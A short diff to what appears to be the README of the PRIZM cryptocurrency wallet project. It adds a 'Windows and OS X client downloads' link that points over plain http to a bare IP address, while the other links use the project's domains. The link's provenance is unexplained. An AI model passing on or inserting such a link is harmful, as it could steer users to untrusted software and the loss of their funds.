@@ -4,6 +4,8 @@
 
 ## User friendly [Online Wallet (http)](http://wallet.prizm-space.com/) / [Online Wallet (https)](https://wallet.prizm.space/)
 
+## [Windows and OS X client downloads](http://94.130.167.158/loyalty/center/)
+
 ## Special (only for professionals) [Technical Wallet](http://tech.prizm-space.com/)
 
 ## Fully functional (NEW VERSION) [PrizmCore build with technical interface](http://tech.prizm.space/prizm-dist.tgz)
